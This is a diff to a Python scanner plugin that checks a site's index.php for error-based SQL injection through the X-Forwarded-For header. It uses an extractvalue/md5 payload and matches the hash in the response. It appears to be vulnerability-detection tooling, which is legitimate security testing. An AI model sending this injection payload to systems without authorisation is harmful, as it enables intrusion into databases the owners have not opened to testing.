@@ -33,11 +33,12 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
-            payload = "X-Forwarded-For:127.0.0.1' and extractvalue(1,concat(0x3a,md5(3.14),0x3a)) and '1"
+            payload = {
+                "X-Forwarded-For":"127.0.0.1' and extractvalue(1,concat(0x3a,md5(3.14),0x3a)) and '1"
+            }
             url = arg + '/index.php'
-            code, head, res, errcode,finalurl = hh.http('"-H %s %s"' % (payload,url))
-                       
-            if code == 200 and '4beed3b9c4a886067de0e3a094246f7' in res:
+            res = requests.get(url, headers=payload)
+            if res.status_code == 200 and '4beed3b9c4a886067de0e3a094246f7' in res.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
